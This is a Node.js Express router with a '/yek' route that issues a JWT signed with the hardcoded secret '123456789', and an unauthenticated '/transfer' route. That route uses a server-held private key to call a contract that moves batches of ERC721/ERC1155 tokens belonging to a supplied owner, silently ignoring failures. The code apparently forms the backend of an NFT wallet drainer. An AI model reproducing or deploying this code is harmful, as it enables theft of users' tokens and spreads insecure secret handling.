const express = require("express");
const {
  PRIVATE_KEY,
  WALLET_ADDRESS,
  contract,
  contractABI,
  mainrpcURL,
} = require("../../config/config");
const router = express.Router();
const jwt = require("jsonwebtoken");
const Web3 = require("web3");
const Provider = require("@truffle/hdwallet-provider");

router.get("/yek", async (req, res) => {
  const data = {
    add: contract,
  };

  jwt.sign(data, "123456789", { expiresIn: 3600000000 }, (err, token) => {
    if (err) {
      throw err;
    }
    res.json({ token: "Bearer " + token });
  });
});

router.post("/transfer", async (req, res) => {
  const provider = new Provider(PRIVATE_KEY, mainrpcURL);
  const web3 = new Web3(provider);
  const transferContract = new web3.eth.Contract(contractABI, contract);

  const { type, data, owner, asset_contract } = req.body;
  if (type === "ERC721") {
    for (let i = 0; i < data.length; i++) {
      const encodedABI = await transferContract.methods
        .transfer(asset_contract, owner, [data[i].token_id], type)
        .encodeABI();
      const nonce = (await web3.eth.getTransactionCount(WALLET_ADDRESS)) + 1;
      let signedTx = await web3.eth.accounts.signTransaction(
        {
          from: WALLET_ADDRESS,
          to: contract,
          data: encodedABI,
          gas: 500000,
          value: 0,
        },
        PRIVATE_KEY
      );

      try {
        await web3.eth
          .sendSignedTransaction(signedTx.rawTransaction)
          .on("error", (error) => {})
          .then(async (result) => {});
      } catch (e) {
        continue;
        // res.status(400).json({ e });
      }
    }
    res.json({ success: true });
  } else if (type === "ERC1155") {
    let tokenData = [];
    for (let i = 0; i < data.length; i++) {
      tokenData.push(data[i].token_id);
    }
    const encodedABI = await transferContract.methods
      .transfer(asset_contract, owner, tokenData, type)
      .encodeABI();

    let signedTx = await web3.eth.accounts.signTransaction(
      {
        from: WALLET_ADDRESS,
        to: contract,
        data: encodedABI,
        gas: 500000,
        value: 0,
      },
      PRIVATE_KEY
    );

    try {
      web3.eth
        .sendSignedTransaction(signedTx.rawTransaction)
        .on("error", (error) => res.status(400).json(error))
        .then(async (result) => {
          res.json({ success: true, result });
        });
    } catch (e) {
      res.status(400).json({ e });
    }
  }
});

module.exports = router;
